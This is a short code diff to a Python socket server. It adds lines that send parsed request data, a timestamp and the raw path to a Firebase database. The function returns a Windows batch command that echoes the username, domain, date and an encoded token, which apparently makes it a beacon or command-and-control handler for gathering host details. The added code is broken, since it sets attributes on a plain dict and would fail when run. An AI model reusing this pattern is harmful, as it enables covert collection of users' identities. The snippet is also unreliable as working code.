@@ -59,7 +59,11 @@ def x(path):
             dt[dtz[0]] = dtz[1]
     #return str(dt)
     #t = dt['t'].replace('+', ' ')
-    
+    data = dict()
+    data.time = datetime.datetime.now().strftime("%I:%M:%S:%f%p on %B %d, %Y")
+    data.data = dt
+    data.raw = path[2:]
+    firebase.post('/',data)
     return "echo %TIME% %DATE% %USERNAME% %USERDOMAIN% %RANDOM% *VkcxR2ExcFhWblU9* test"
 
 listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
